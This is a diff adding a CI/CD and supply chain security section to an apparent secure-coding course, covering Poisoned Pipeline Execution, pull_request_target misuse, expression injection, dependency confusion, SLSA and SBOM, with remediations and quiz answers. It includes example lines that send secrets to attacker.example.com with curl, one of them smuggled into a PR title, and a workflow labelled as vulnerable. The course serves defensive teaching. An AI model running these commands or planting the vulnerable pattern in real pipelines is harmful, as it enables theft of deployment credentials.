@@ -12,6 +12,7 @@ By completing this module, security practitioners and software engineers will be
 4. Apply cryptographic engineering standards correctly in application logic, avoiding catastrophic implementation failures such as predictable pseudo-random number generation, IV reuse, and ECB mode ciphers.
 5. Conduct systematic Threat Modeling using the STRIDE and DREAD methodologies to identify security design flaws prior to software deployment.
 6. Build and execute automated Static Application Security Testing (SAST) and Software Composition Analysis (SCA) verification rules within continuous integration (CI/CD) pipelines.
+7. Audit CI/CD pipelines and software supply chains, identifying Poisoned Pipeline Execution (PPE), GitHub Actions privilege escalation (`pull_request_target`), dependency confusion, and enforcing SLSA/SBOM integrity standards.
 
 ---
 
@@ -120,6 +121,109 @@ Applying cryptography in code requires selecting modern, peer-reviewed primitive
 #### 3. Random Number Generation
 * **Insecure**: Standard pseudo-random number generators (PRNGs) like Python's `random`, C's `rand()`, JavaScript's `Math.random()`. These use deterministic linear congruential generators or Mersenne Twister algorithms predictable after observing sample outputs.
 * **Secure Standard**: Cryptographically Secure Pseudo-Random Number Generators (CSPRNGs): Python's `secrets` module, Linux `/dev/urandom`, Windows `BCryptGenRandom()`, Web Crypto `crypto.getRandomValues()`.
+
+---
+
+### 4.4 CI/CD Pipeline Security & Software Supply Chain Protection
+
+Modern software is built and released via Continuous Integration and Continuous Deployment (CI/CD) pipelines (GitHub Actions, GitLab CI, Jenkins). These automated build environments run arbitrary code with privileged access to production deployment keys, cloud credentials, and artifact registries, making them prime targets for software supply chain compromise.
+
+```mermaid
+graph LR
+    subgraph "Untrusted Contributor"
+        DEV["Attacker Fork / PR"]
+    end
+
+    subgraph "CI/CD Pipeline Runner (GitHub Actions)"
+        TRIGGER["pull_request_target Trigger<br/>(Runs with Base Repo Privileges)"]
+        CHECKOUT["actions/checkout<br/>(Checks out Untrusted PR Code)"]
+        EXEC["Run Test / Build Script<br/>(npm test / make build)"]
+        SECRETS["Repository Secrets & Cloud Keys<br/>(AWS_SECRET_KEY, PROD_DEPLOY_KEY)"]
+    end
+
+    subgraph "Production Infrastructure"
+        PROD["Production Kubernetes Cluster"]
+    end
+
+    DEV -->|"1. Malicious Pull Request"| TRIGGER
+    TRIGGER --> CHECKOUT
+    CHECKOUT --> EXEC
+    EXEC -->|"2. Exfiltrates Keys"| SECRETS
+    EXEC -.->|"3. Direct Code Execution"| PROD
+```
+
+#### 4.4.1 Poisoned Pipeline Execution (PPE)
+
+Poisoned Pipeline Execution occurs when an adversary manipulates the pipeline build process to execute unauthorized code on the build runner:
+1. **Direct PPE (Modifying Workflow Definitions)**:
+   - An attacker submits a pull request modifying `.github/workflows/build.yml` to insert a malicious step:
+     ```yaml
+     - name: Exfiltrate Secrets
+       run: curl https://attacker.example.com -d "key=$PROD_AWS_KEY"
+     ```
+   - If the pipeline executes untrusted PR workflows without review gates, the attacker gains full control of the runner.
+2. **Indirect PPE (Manipulating Invoked Scripts)**:
+   - Even if workflow files are protected, pipelines frequently execute project scripts (e.g., `npm test`, `python setup.py test`, `make test`, or custom `./scripts/build.sh`).
+   - The attacker modifies the project script in their branch. When the CI workflow executes `npm test`, the runner executes the attacker's payload!
+
+#### 4.4.2 Critical GitHub Actions Attack Vectors
+
+1. **The `pull_request_target` Trap**:
+   - Standard `pull_request` runs in an isolated, read-only context from forks without access to repository secrets.
+   - `pull_request_target` runs in the context of the **base target repository** with access to repository secrets and write permissions for `GITHUB_TOKEN`.
+   - **Vulnerable Pattern**: Checking out untrusted PR head code inside a `pull_request_target` workflow:
+     ```yaml
+     # CRITICALLY VULNERABLE WORKFLOW
+     on:
+       pull_request_target:
+     jobs:
+       build:
+         runs-on: ubuntu-latest
+         steps:
+           - uses: actions/checkout@v3
+             with:
+               ref: ${{ github.event.pull_request.head.sha }} # Checks out untrusted code!
+           - run: npm install && npm test                     # Arbitrary RCE with secrets!
+     ```
+2. **Context Expression Script Injection**:
+   - GitHub Actions expressions like `${{ github.event.issue.title }}` or `${{ github.event.comment.body }}` are evaluated before shell invocation:
+     ```yaml
+     # VULNERABLE: Direct expression interpolation into shell
+     - run: echo "Processing PR: ${{ github.event.pull_request.title }}"
+     # If PR Title is: `test"; curl https://attacker.example.com/exfil?k=$SECRET; #`
+     # The shell executes the injected curl command!
+     
+     # REMEDIATION: Pass untrusted values via intermediate environment variables
+     - name: Safe Log
+       env:
+         PR_TITLE: ${{ github.event.pull_request.title }}
+       run: echo "Processing PR: $PR_TITLE"
+     ```
+
+#### 4.4.3 Software Supply Chain Vulnerabilities: Dependency Confusion & Typosquatting
+
+1. **Dependency Confusion (Namespace Confusion)**:
+   - Enterprise organizations use internal private packages (e.g., `@corp-internal/payment-lib` or `corp-logger`).
+   - Build tools (npm, pip, Maven) are often configured to query public registries (npmjs.com, PyPI) alongside private artifact repositories.
+   - If the package name is not registered on the public registry, an external attacker registers the identical name on public npm with version `99.9.9`.
+   - The build tool automatically fetches the higher version from the public registry, executing pre-install hooks (`package.json` `"preinstall"`) on developer machines and CI servers.
+   - **Remediation**: Claim organizational scope namespaces on public registries (e.g., reserve `@corp-internal` on npm); configure package managers with explicit repository routing rules (`.npmrc` scoped registries).
+2. **Software Bill of Materials (SBOM) & Supply-chain Levels for Software Artifacts (SLSA)**:
+   - **SBOM**: A formal machine-readable inventory of software components, dependencies, versions, and licenses. Standard formats include **CycloneDX** (OWASP) and **SPDX** (Linux Foundation). Generated via tools like `syft dir:. -o cyclonedx-json=sbom.json`.
+   - **SLSA (sal-sa)**: A security framework defining 4 levels of software artifact integrity:
+     - *SLSA Level 1*: Documented build process and provenance generation.
+     - *SLSA Level 2*: Hosted build platform (e.g., GitHub Actions), tamper-resistant provenance signed by the build service.
+     - *SLSA Level 3*: Hardened isolated ephemeral build environments preventing lateral access.
+     - *SLSA Level 4*: Hermetic builds, reproducible builds, and mandatory two-person code reviews for all dependencies.
+   - **Cryptographic Provenance Signing with Sigstore Cosign**:
+     ```bash
+     # Sign container image with keyless OIDC identity from GitHub Actions
+     cosign sign --yes ghcr.io/org/app:v1.0.0
+     
+     # Verify artifact provenance before deployment in Kubernetes
+     cosign verify --certificate-identity "https://github.com/org/app/.github/workflows/deploy.yml@refs/heads/main" \
+       ghcr.io/org/app:v1.0.0
+     ```
 
 ---
 
@@ -512,6 +616,10 @@ app.use(session({
 
 ### Scenario-Based Questions
 9. *Scenario*: During an audit of a REST API endpoint `GET /api/v2/invoices/:id`, you observe that User A can retrieve User B's invoices simply by altering the numeric ID in the URL. Classify this vulnerability (CWE), explain the architectural root cause, and provide the exact backend logic required to remediate it.
+10. *Scenario*: In GitHub Actions, why is the `pull_request_target` trigger considered dangerous when paired with an `actions/checkout` step using `ref: ${{ github.event.pull_request.head.sha }}`, and how can an external contributor exploit this to steal production repository secrets?
+    * *Answer*: `pull_request_target` runs in the context of the base repository rather than the fork, granting it access to repository secrets and write permissions for `GITHUB_TOKEN`. When paired with checking out the pull request's untrusted head SHA, the runner downloads and executes untrusted code supplied by an external PR author (e.g., inside `npm test` or build scripts) with repository secrets loaded in the runner environment. The attacker can easily read environment variables or memory and exfiltrate secrets to an external server. The remediation is to never check out untrusted PR code in a `pull_request_target` workflow, or to use the isolated `pull_request` event for building and testing untrusted code.
+11. Explain **Dependency Confusion** and how it differs from **Typosquatting** in software supply chain attacks.
+    * *Answer*: Dependency Confusion occurs when an internal private package (e.g., `@corp/billing`) is not registered on public package registries (like npm or PyPI). An attacker registers that exact package name on the public registry with an artificially inflated version number (e.g., `99.9.9`). When the enterprise build system or developer installs dependencies, default package managers query the public index, find the higher version number, and install the attacker's public package containing malicious pre-install hooks. In contrast, Typosquatting relies on human error, where an attacker registers slightly misspelled variations of popular legitimate open-source packages (e.g., `reqeusts` instead of `requests`).
 
 ---
 
